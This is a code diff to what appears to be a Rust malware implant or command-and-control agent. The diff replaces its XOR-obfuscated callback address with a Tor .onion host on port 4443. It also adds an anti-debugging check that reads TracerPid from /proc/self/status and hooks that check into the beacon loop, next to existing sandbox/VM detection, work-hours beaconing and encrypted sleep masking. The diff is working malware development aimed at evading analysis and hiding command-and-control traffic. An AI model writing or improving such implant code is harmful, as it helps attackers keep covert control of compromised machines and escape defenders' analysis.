@@ -43,7 +43,7 @@ fn xor_decode_stack<const N: usize>(encoded: &[u8; N]) -> [u8; N] {
     out
 }
 
-const ENC_DEFAULT_IP: [u8; 14] = xor_encode(b"192.168.100.18");
+const ENC_DEFAULT_IP: [u8; 62] = xor_encode(b"htaws5zgxla4md6o4jeuto7ru2yafsbhfcbgdn63jbk3o5ert6zmplid.onion");
 const ENC_DEFAULT_PORT: [u8; 4] = xor_encode(b"4443");
 
 // SOCKS5 proxy configuration
@@ -139,6 +139,18 @@ const WORK_HOUR_START: u32 = 7;
 const WORK_HOUR_END: u32 = 23;
 
 // ── Sandbox / VM detection ──────────────────────────────────────────────
+
+fn is_debugger_attached() -> bool {
+    if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
+        for line in status.lines() {
+            if line.starts_with("TracerPid:") {
+                let pid = line.split(':').nth(1).unwrap_or("0").trim();
+                return pid != "0";
+            }
+        }
+    }
+    false
+}
 
 fn check_sandbox() -> bool {
     let mut score: u32 = 0;
@@ -1895,9 +1907,13 @@ fn main() {
     let mut attempt = 0usize;
 
     loop {
+        if !debug && is_debugger_attached() {
+            sleep_mask_encrypt(Duration::from_secs(jitter(600)));
+            continue;
+        }
+
         if !is_work_hours() {
             let sleep_secs = jitter(seconds_until_work_hours());
-            // Use sleep mask encryption during long sleeps
             sleep_mask_encrypt(Duration::from_secs(sleep_secs));
             continue;
         }
